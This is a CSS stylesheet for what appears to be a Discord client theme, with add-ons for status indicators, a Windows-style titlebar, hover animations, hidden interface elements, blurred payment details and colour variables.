    background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0yMi43MzcgMTJjMCA1LjkzLTQuODA3IDEwLjczNy0xMC43MzcgMTAuNzM3UzEuMjYzIDE3LjkzIDEuMjYzIDEyIDYuMDcgMS4yNjMgMTIgMS4yNjMgMjIuNzM3IDYuMDcgMjIuNzM3IDEyeiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTEyIDEzLjg5NWMtMi4yODggMC0zLjgwNi0uMjY3LTUuNjg0LS42MzItLjQyOS0uMDgzLTEuMjYzIDAtMS4yNjMgMS4yNjMgMCAyLjUyNyAyLjkwMiA1LjY4NCA2Ljk0NyA1LjY4NHM2Ljk0Ny0zLjE1NyA2Ljk0Ny01LjY4NGMwLTEuMjYzLS44MzQtMS4zNDYtMS4yNjMtMS4yNjMtMS44NzcuMzY1LTMuMzk2LjYzMi01LjY4NC42MzJ6TTYuOTQ3IDguODQyczAtMS4yNjMgMS4yNjQtMS4yNjNjMS4yNjMgMCAxLjI2MyAxLjI2MyAxLjI2MyAxLjI2M3YxLjI2M3MwIDEuMjYzLTEuMjYzIDEuMjYzYy0xLjI2NCAwLTEuMjY0LTEuMjYzLTEuMjY0LTEuMjYzVjguODQyek0xNC41MjYgOC44NDJzMC0xLjI2MyAxLjI2NC0xLjI2M2MxLjI2MyAwIDEuMjYzIDEuMjYzIDEuMjYzIDEuMjYzdjEuMjYzczAgMS4yNjMtMS4yNjQgMS4yNjNjLTEuMjYzIDAtMS4yNjMtMS4yNjMtMS4yNjMtMS4yNjNWOC44NDJ6IiBmaWxsPSIjNEY1NDVDIi8+CjxwYXRoIGQ9Ik02LjMxNiAxNC41MjZzMS44OTUuNjMyIDUuNjg0LjYzMmMzLjc5IDAgNS42ODQtLjYzMiA1LjY4NC0uNjMyUzE2LjQyMSAxNy4wNTMgMTIgMTcuMDUzcy01LjY4NC0yLjUyNy01LjY4NC0yLjUyN3oiIGZpbGw9IiNmZmYiLz4KPC9zdmc+) !important;
}
div#status-picker-custom-status > .statusItem-33LqPf {
    animation: fadeIn 0.4s;
    display: grid !important;
    margin-top: 20px !important;
    margin-left: 10px !important;
    border-radius: var(--border-radius) !important;
    bottom: 89px !important;
    left: 86px !important;
    position: fixed !important;
    width: 216px !important;
    transition: 0.2s ease-in-out, background 0.2s ease-in-out, margin-left 4s ease-in-out !important;
    font-size: 14px;
    background: linear-gradient(to right, var(--background-accent) 50%, transparent 50%);
    background-size: 200% 100%;
    background-position: right bottom;
}
div#status-picker-custom-status > .statusItem-33LqPf:hover {
  background-position: left bottom;
}
div#status-picker-account.item-1tOPte.focused-3afm-j:nth-child(3) > div.statusItem-33LqPf > div.changeAccount.customAccount {
    background-color: var(--background-accent);
    width: 119px !important;
    background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0id2hpdGUiIHdpZHRoPSIxOHB4IiBoZWlnaHQ9IjE4cHgiPjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz48cGF0aCBkPSJNMTYgMTFjMS42NiAwIDIuOTktMS4zNCAyLjk5LTNTMTcuNjYgNSAxNiA1Yy0xLjY2IDAtMyAxLjM0LTMgM3MxLjM0IDMgMyAzem0tOCAwYzEuNjYgMCAyLjk5LTEuMzQgMi45OS0zUzkuNjYgNSA4IDVDNi4zNCA1IDUgNi4zNCA1IDhzMS4zNCAzIDMgM3ptMCAyYy0yLjMzIDAtNyAxLjE3LTcgMy41VjE5aDE0di0yLjVjMC0yLjMzLTQuNjctMy41LTctMy41em04IDBjLS4yOSAwLS42Mi4wMi0uOTcuMDUgMS4xNi44NCAxLjk3IDEuOTcgMS45NyAzLjQ1VjE5aDZ2LTIuNWMwLTIuMzMtNC42Ny0zLjUtNy0zLjV6Ii8+PC9zdmc+);
    background-size: contain;
    background-repeat: no-repeat;
    outline: white;
    background-position-x: 3px;
}
div.changeAccount.customAccount {
    border-radius: 3px;
    transition: 0.2s ease-in-out, background-color 0.1s ease-in-out, margin-left 4s ease-in-out;
}
div#status-picker-account.item-1tOPte.focused-3afm-j:nth-child(3) > div.statusItem-33LqPf > div.status-1fhblQ {
   padding-left: 3px;
   font-weight: bold;
   color: white;
}
div#status-picker-account.item-1tOPte > div.statusItem-33LqPf > div.status-1fhblQ {
    transition: 0.2s ease-in-out, background-color 0.1s ease-in-out, margin-left 4s ease-in-out;
}
#app-mount .container-3baos1 .avatarWrapper-2yR4wp[aria-expanded=true]::after {
    content: "";
    cursor: pointer;
    transition: 1s ease-in-out;
    background-color: var(--background-modifier-selected) !important;
    position: absolute;
    -webkit-mask-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBlbmFibGUtYmFja2dyb3VuZD0ibmV3IDAgMCA1NCA1NCIgdmVyc2lvbj0iMS4xIiB2aWV3Qm94PSIwIDAgNTQgNTQiIHhtbDpzcGFjZT0icHJlc2VydmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTI3LDBDMTIuMTEyLDAsMCwxMi4xMTIsMCwyN3MxMi4xMTIsMjcsMjcsMjdzMjctMTIuMTEyLDI3LTI3UzQxLjg4OCwwLDI3LDB6IE0yNyw1MkMxMy4yMTUsNTIsMiw0MC43ODUsMiwyNyAgICBTMTMuMjE1LDIsMjcsMnMyNSwxMS4yMTUsMjUsMjVTNDAuNzg1LDUyLDI3LDUyeiIvPjxwYXRoIGQ9Im0yNy43MDcgMTguOTM1Yy0wLjM5MS0wLjM5MS0xLjAyMy0wLjM5MS0xLjQxNCAwbC0xMC41IDEwLjVjLTAuMzkxIDAuMzkxLTAuMzkxIDEuMDIzIDAgMS40MTRzMS4wMjMgMC4zOTEgMS40MTQgMGw5Ljc5My05Ljc5MyA5Ljc5MyA5Ljc5M2MwLjE5NSAwLjE5NSAwLjQ1MSAwLjI5MyAwLjcwNyAwLjI5M3MwLjUxMi0wLjA5OCAwLjcwNy0wLjI5M2MwLjM5MS0wLjM5MSAwLjM5MS0xLjAyMyAwLTEuNDE0bC0xMC41LTEwLjV6Ii8+PC9zdmc+);
    border-radius: 25px;
    padding: 16px;
}
#app-mount .container-3baos1 .avatarWrapper-2yR4wp[aria-expanded=true] {
    width: 30px;
}
.ring-13rgEW {
top: 0px;
}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-On | Old Status Indicator ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
.header-QKLPzZ rect[mask="url(#svg-mask-status-online)"], .userPopout-3XzG_A rect[mask="url(#svg-mask-status-online)"] {
    fill: #43b581; }
.wrapper-3t9DeA rect[mask="url(#svg-mask-status-idle)"] {
    fill: #faa61a;
    mask: url(#svg-mask-status-online); }
.wrapper-3t9DeA rect[mask="url(#svg-mask-status-dnd)"] {
    fill: #f04747;
    mask: url(#svg-mask-status-online); }
.wrapper-3t9DeA rect[mask="url(#svg-mask-status-streaming)"]{
    mask: url(#svg-mask-status-online);}
.wrapper-3t9DeA rect[mask="url(#svg-mask-status-offline)"] {
    mask: url(#svg-mask-status-online);}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-Ons | Yellow Permissons ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
.passthroughSelected-1Eq0Kl {
    background: #ffba00 !important;}
  .passthrough-1c2ewQ:not(.passthroughSelected-1Eq0Kl) img {
    content: url("https://raw.githubusercontent.com/CorellanStoma/Powercord/assets/Icons/yellow.svg");}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-Ons | Windows Titlebar |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
#app-mount {
    border: none;
    box-sizing:border-box;}
.typeWindows-1za-n7 {
    height:calc(var(--titlebar-height) - var(--titlebar-drag-margin));
    margin-top:var(--titlebar-drag-margin);
    position:relative;
    border-bottom:1px solid var(--titlebar-background-color);}
.platform-win .layer-3QrUeG {
    top:calc(var(--titlebar-height) * -1);
    padding-top:var(--titlebar-height);}
.winButton-iRh8-Z,
.winButton-iRh8-Z:hover,
.winButton-iRh8-Z:active {
    height:var(--titlebar-height);
    width:var(--titlebar-button-width);
    top:calc(var(--titlebar-drag-margin) * -1);
    color:var(--titlebar-text-color);
    transition:125ms ease;
    cursor:default;}
.winButton-iRh8-Z svg {
    width:11px;
    height:11px;}
.winButtonMinMax-PBQ2gm:hover {
    background:var(--titlebar-button-hover);
}
.winButtonMinMax-PBQ2gm:nth-child(3):after {
      content:'';
      width:11px;
      height:11px;
      -webkit-mask:url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" version="1.1" width="10" height="10"><path d="M 0,0 0,10 10,10 10,0 Z M 1,1 9,1 9,9 1,9 Z"/></svg>') center/11px no-repeat;
      background:var(--titlebar-text-color);}
.winButtonMinMax-PBQ2gm:nth-child(3) svg {
    display:none;}
.winButtonMinMax-PBQ2gm:active {
    background:var(--titlebar-button-active);}
.winButtonClose-1HsbF-:hover,
.winButtonClose-1HsbF-:active {
    color:#fff;}
.winButtonClose-1HsbF-:hover {
    background:var(--titlebar-close-button-hover);}
.winButtonClose-1HsbF-:active {
    background:var(--titlebar-close-button-active);}
.wordmarkWindows-1v0lYD {
	width: 100vw;
	background: var(--titlebar-background-color);
	padding: 0;
	display: flex;
	align-items: center;
    top:calc(var(--titlebar-drag-margin) * -1);
	height:calc(var(--titlebar-height) + 1px);
	pointer-events:none;
	box-sizing:border-box;
	border-bottom:0;}
.wordmarkWindows-1v0lYD svg {
    display:none;}
.wordmarkWindows-1v0lYD::before {
    content:'';
    width:1em;
    height:1em;
    font-size:var(--titlebar-icon-font-size);
    padding:0 1em;
    background: url('https://raw.githubusercontent.com/CorellanStoma/Powercord/assets/Icons/discord.svg') center/contain no-repeat;}
.wordmarkWindows-1v0lYD::after {
    content: "\a CreArts " var(--version);
    color:var(--titlebar-text-color);
    font-size:var(--titlebar-font-size);
    font-weight:400;
    font-family:'Segoe UI';}
.withFrame-haYltI {
    height: var(--titlebar-height);
    margin-top: var(--titlebar-drag-margin);}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-Ons | Mobile Menu ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
.button-1w5pas {
  background: url('https://raw.githack.com/CorellanStoma/Powercord/assets/Icons/menu.svg');
  width: 18px;
  height: 18px;
  position: relative;
  opacity: 1;
  top: -1px;}
.button-1w5pas path {
  display: none;}
.button-1w5pas.open-1Te94t {
  transform: none;}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-Ons | Autocomplete Scrollable */ /*|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
.autocomplete-1vrmpx {
    max-height: calc(100vh - 200px);
    overflow-y: scroll;}
.autocomplete-1vrmpx::-webkit-scrollbar-thumb {
    background-clip: padding-box;
    border: 2px solid transparent;
    border-radius: 4px;
    background-color: var(--scrollbar-thin-thumb);
    min-height: 40px;}
.autocomplete-1vrmpx::-webkit-scrollbar {
    width: 0px;
    height: 0px;}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-Ons | Mention Color*/ /*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
.mentioned-xhSam7:before {
    background: rgba(var(--Mention), 1);}
.mentioned-xhSam7 {
    background: rgba(var(--Mention), 0.1);
    border-radius: 0 24px 24px 0px;
    margin-right: 20px}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-Ons | Blur Details*/ /*|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
#app-mount .standardSidebarView-3F1I7i .payment-info .description-3_Ncsb,
#app-mount .standardSidebarView-3F1I7i .paymentSourceRow-3FbcL_ .subText-V8PTt8,
#app-mount .standardSidebarView-3F1I7i .userSettingsAccount-2eMFVR div:nth-child(2) > div:nth-child(2) > .viewBody-2Qz-jg {
    transition: all 150ms cubic-bezier(0.550, 0.085, 0.680, 0.530);
    filter: blur(4px);
    opacity: 0.8;}
#app-mount .standardSidebarView-3F1I7i .payment-info .description-3_Ncsb:hover,
#app-mount .standardSidebarView-3F1I7i .paymentSourceRow-3FbcL_ .subText-V8PTt8:hover,
#app-mount .standardSidebarView-3F1I7i .userSettingsAccount-2eMFVR div:nth-child(2) > div:nth-child(2) > .viewBody-2Qz-jg:hover {
    transition: all 150ms cubic-bezier(0.55, 0.09, 0.68, 0.53);
    filter: none;
    opacity: 1;}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Animated |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Animated | Ping */
/* Currently disabled */

/* Animated | Home Button */
/* Currently disabled */

/* Animated | Avatar Hover */
.avatar-1BDn8e.clickable-1bVtEA{display:inline-block;cursor:pointer;transition:all .2s ease-in-out}
.avatar-1BDn8e.clickable-1bVtEA:hover{display:inline-block;cursor:pointer;transform:scale(1.2)}
,.avatar-SmRMf2{z-index:20;transition:all .2s ease-in-out}
.avatar-SmRMf2:hover{transform:scale(1.1)}

/* Animated | Icons Hover */
.addButton-1BORrom,.button-14-BFJ,.closeButton-1tv5uR,.closeButton-2GCmT5,.grow-q77ONN,.icon-22AiRD,.iconItem-1-bXkn{transition:all .2s ease-in-out}
.addButton-1BORro:hover,.button-14-BFJ:hover,.closeButton-1tv5uR:hover,.closeButton-2GCmT5:hover,.icon-22AiRD:hover,.iconItem-1-bXkn:hover{transform:scale(1.2)}

/* Animated | Chat Highlight */
.cozy-3raOZG.wrapper-2a6GCs{transition:all .2s ease-in-out}
.cozy-3raOZG.wrapper-2a6GCs:hover{margin-left:12px;transition-delay:.1s}

/* Animated | Channel Highlight */
.mainContent-ENyL1r{transition:all .2s ease-in-out}
.mainContent-ENyL1r:hover{margin-left:6px}

/* Animated | Profile Badge */
.header-QKLPzZ .headerInfo-30uryT .flex-1xMQg5 div{transition:.2s}
.header-QKLPzZ .headerInfo-30uryT .flex-1xMQg5 div:hover{transition:.2s;transform:translateY(-.75px)}

/* Animated | Card Hover */
.auditLog-3jNbM6,.card-3Qj_Yx,.card-FDVird,.connectedAccount-36nQx7,.elevationLow-2lY09M,.item-3eFBNF,.welcomeChannel-1rFrIO{transition:all .2s ease-in-out}
.auditLog-3jNbM6:hover,.card-3Qj_Yx:hover,.card-FDVird:hover,.connectedAccount-36nQx7:hover,.elevationLow-2lY09M:hover,.item-3eFBNF:hover,.welcomeChannel-1rFrIO:hover{transform:scale(1.04)}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Removed ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Removed | Removed the Edited label. */
.edited-3sfAzf {display: none;}

/* Removed | Removed the Nitro home button, the nitro menu can still be accessed via the settings. */
#private-channels [href="/store"] {display: none;}

/* Removed | Removed the chat header at the beginning of the chat. */
.hasDivider-20M1le {display: none;}
.container-3zqIcM {display: none;}

/* Removed | Removed the Nitro & Gif Button in the Chatbox. Gifs can still be selected using the Emoji button. */
.buttonWrapper-1ZmCpA {display: none;}

/* Removed | Removed the closed folder background. */
.closedFolderIconWrapper-15K9MK { background: var(--Color004);}

/* Removed | Removed the Note on the User Profile. */
.note-QfFU8y, .userInfoSectionHeader-CBvMDh  { display: none;}
.userInfoSection-2acyCx {padding: 0px 0;}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Plugins ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Plugins | Changed the design from "Better Formatting Redux" */
.bf-toolbar::before { background: var(--Color005); border-radius: 90px;}

.bf-toolbar .format { padding: 7px 7px; border-radius: 90px; }

/* Plugins | Total Member Count" */
.total-members-count-box{position:sticky;padding:0;font-size:15px;font-weight:500}

.total-members-count{justify-content:left;background:var(--Color004);padding:12px 140px 12px 60px}

/* Plugins | Audioviz" */
.vp-audioviz-bar{background:var(--audioviz)}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Theme Settings |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark,
:root {

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Version ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

--version: "v1.2.4 (Beta) (FoxCode Team)"; /*Theme Version*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| CUSTOMIZATION ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Font */

    --font: 'Oxygen';

/* Accent */
    --Color001: #04D869;
    --Color010: #43B581;

/* Background */
    --Color002: #33393D;
    --Color003: #262A2D;
    --Color004: #202427;
    --Color005: #1A1D20;

/* Text */
    --Color006: #FFFFFF;
    --Color007: #DCDDDE;
    --Color008: #b9bbbe;
    --Color009: #4F5459;

/* Mention */

    --Mention: 4,216,105;

/* Shadow */

    --shadow001: 0px 8px 12px 4px #00000040;

/* Radius */

    --Radius001: 24px; /* The value should not exceed 24px. */
    --Radius002: 90px; /* The value should not exceed 90px. */

/* Picture-in-oicture Opacity */

    --picture-in-picture: 60%;

/* Avatar Size */

    --avatar-size: 60px;

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Blurple Recolor ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

    --accentcolor: 4,216,105;
    --linkcolor: 4,216,105;

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Audioviz |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

--audioviz: var(--Color001);

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| SettingsIcons ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

    --settings-icon-color: var(--Color007);
    --settings-subscriptions: var(--Color007);
    --settings-hypesquad: var(--Color007);
    --settings-logout: #f04747;
    --settings-alt-focused: var(--Color007);
    --settings-guild-premium: var(--Color007);
    --settings-guild-delete: #f04747;

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Windows 10 Titlebar ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

    --titlebar-height: 30px;
    --titlebar-drag-margin: 4px;
    --titlebar-button-width: 48px;
    --titlebar-font-size: 12px;
    --titlebar-icon-font-size: 12px;
    --titlebar-background-color: var(--Color005);
    --titlebar-text-color: var(--Color007);
    --titlebar-button-hover: var(--Color003);
    --titlebar-button-active: var(--Color003);
    --titlebar-close-button-hover: var(--Color001);
    --titlebar-close-button-active: var(--Color001);

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Radius |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

    --Radius001: 24px; /* The value should not exceed 24px. */
    --Radius002: 90px; /* The value should not exceed 90px. */

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Variables ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

    --background-primary: var(--Color004);
    --background-secondary: var(--Color005);
    --background-secondary-alt: var(--Color002);
    --background-tertiary: var(--Color005);
    --background-accent: var(--Color001);
    --background-floating: var(--Color005);
    --background-modifier-hover: var(--Color004);
    --background-modifier-active: var(--Color004);
    --background-modifier-selected: var(--Color001);
    --background-modifier-accent: var(--Color002);
    --channeltextarea-background: var(--Color001);
    --deprecated-card-bg: var(--Color004);
    --deprecated-card-editable-bg: var(--Color004);
    --deprecated-text-input-bg: var(--Color005);
    --deprecated-text-input-border: var(--Color005);
    --deprecated-text-input-border-disabled: var(--Color005);
    --activity-card-background: var(--Color004);
    --channels-default: var(--Color008);
    --interactive-normal: var(--Color008);
    --interactive-hover: var(--Color006);
    --interactive-active: var(--Color006);
    --interactive-muted: var(--Color009);
    --header-primary: var(--Color006);
    --toast-background: var(--Color006);
    --toast-header: var(--Color005);
    --toast-contents: var(--Color006);
    --toast-box-shadow: rgba(0, 0, 0, .2);
    --toast-border: var(--Color005);
    --header-secondary: var(--Color008);
    --channel-list: var(--Color003);
    --offline-color: var(--Color004);
    --text-normal: var(--Color007);
    --text-muted: var(--Color009);
    --spotify-color: var(--Color001);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Mention ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Mention */

.mention-1f5kbO {
    background: var(--Color001);
    opacity: 1;
    height: 20px;
    border-radius: 12px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Settings |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Version */

.info-1VyQPT .size12-3cLvbJ:last-child::after{
    content: "\a FoxCode " var(--version);
    text-transform: none;
    white-space: pre;
}

/* Background */
.sidebarRegionScroller-3MXcoP, .contentRegionScroller-26nc1e {
    background: var(--Color003);
}

/* Sidebar */
.sidebar-CFHs9e {
    background: var(--Color004);
    border-radius: 24px;
    padding: 30px 20px 20px 20px;
    margin: 60px 0px 60px 0px;
    width: 240px;
}

.header-2RyJ0Y {
    font-size: 12px;
    font-weight: 700;
    line-height: 16px;
    text-transform: uppercase;
    color: var(--Color008);
}

/* Content */
.contentColumnDefault-1VQkGM {
	background: var(--Color004);
   	border-radius: 24px;
   	padding-top: 30px;
	margin-top: 60px;
	margin-left: 60px;
	margin-right: 60px;
	margin-bottom: 60px;
}

/* Highlight */
.side-8zPYf6 .themed-OHr7kt.selected-3s45Ha.item-PXvHYJ, .topPill-30KHOu .themed-OHr7kt.selected-3s45Ha.item-PXvHYJ {
    background: var(--Color001);
	border-radius: 90px;
}

.side-8zPYf6 .item-PXvHYJ {
	border-radius: 90px;
}

/* Card */
.card-3Qj_Yx {
	background: var(--Color003);
    border-radius: 24px;
    position: relative;
    border: none;
}

/* Buttons */
.lookOutlined-3sRXeN.colorRed-1TFJan {
    background: var(--Color005);
    color: var(--Color008);
    border: none;
}

.lookOutlined-3sRXeN.colorBrand-3pXr91 {
    background: var(--Color005);
    color: var(--Color008);
    border: none;
}

/* Dropdown*/
.css-1a8reka-control {
    background: var(--Color005);
    border-radius: 90px;
    border: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| User Settings | My Account |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Profile */
.userSettingsAccount-2eMFVR .userInfoEditing-1CEzdT, .userSettingsAccount-2eMFVR .userInfoViewing-16kqK3 {
    background: var(--Color003);
    border-radius: 24px;
    padding: 20px;
}



/* Two-Factor | Background */
.root-1gCeng {
    border-radius: 24px;
  }

.header-1TKi98 {
    background: var(--Color003);
    border-radius: 24px 24px 0 0;
}

.content-1LAB8Z {
    background-color: var(--Color003);
    border-radius: 24px 24px;
}

.theme-dark .root-1gCeng {
    background-color: var(--Color003);
	box-shadow: var(--shadow001);
}

.theme-dark .separator-2-RRj_ {
    filter: brightness(110%) ;
    box-shadow: none;
}

.theme-dark .footer-2gL1pp {
    background: var(--Color005);
    border-radius: 0 0 24px 24px;
}

/* Two-Factor | Input */
.input-cIJ7To {
    border-radius: 24px;
    background-color: var(--Color005);
    border: none;
}

/* Two-Factor Button */
.grow-q77ONN, .sizeIcon-1-kvKI {
  border-radius: 24px;
}

/* Two-Factor Text */
.userSettingsSecurity-3IYeMF .isEnabled-24g9qA {
    color: var(--Color010);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| User Settings | Privacy & Safety |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Round Checkbox */
.box-mmYMsp {
    border-radius: 90px;
}

